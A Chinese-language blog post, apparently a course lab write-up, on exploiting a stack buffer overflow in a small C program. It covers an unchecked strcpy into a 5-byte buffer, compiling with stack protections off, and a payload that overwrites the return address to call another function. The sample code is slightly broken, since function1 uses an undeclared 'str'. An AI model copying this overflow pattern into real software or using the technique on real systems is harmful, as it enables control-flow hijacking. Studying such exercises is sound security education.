---
title: 栈溢出利用
date: 2020-09-16 15:59:59
tags: ["随笔"]
index_img: ../assets/gdb-debug.png
---

## 概述

![stack-frames](../assets/stack-frame.jpg)

软件漏洞分析课程的一次作业，利用了栈内存的缓冲区溢出，覆盖了返回地址，从而达到劫持控制流的目的。

## EXP1

```c
#include <stdio.h>
#include <string.h>

void function2()
{
  printf("Executed chagned\n");
}

void function1()
{
  char buffer[5];
  strcpy(buffer,str);
}

void main(int argc, char *argv[])
{
  function1(argv[1]);
  printf("Executed normally\n");
}
```

使用`gdb`进行调试，`strcpy`函数可以被利用引起缓冲区溢出，目前的问题时需要多长的字符串，以及需要将`function1`栈帧的返回地址覆盖为什么

环境

> ubuntu 16.04
>
> gcc 5.4.0
>
> gdb 7.11.1

关闭堆栈保护机制，使用`gcc`编译

```bash
gcc -g main.c -m32 -o main32 -z execstack -fno-stack-protector
```

![gdb](../assets/gdb-debug.png)

可以得出`ebp`与`&buffer`相距 13 个字节，同时返回地址占用 4 个字节，`function2`的地址为`0x0804845B`，构造出 payload`AAAAAAAAAAAAAAAAA\x5B\x84\x04\x08`

![stack-overflow-result](../assets/stack-overlow-result.png)

成功调用了`function2`，同理地址也可以被改成其他的函数地址。
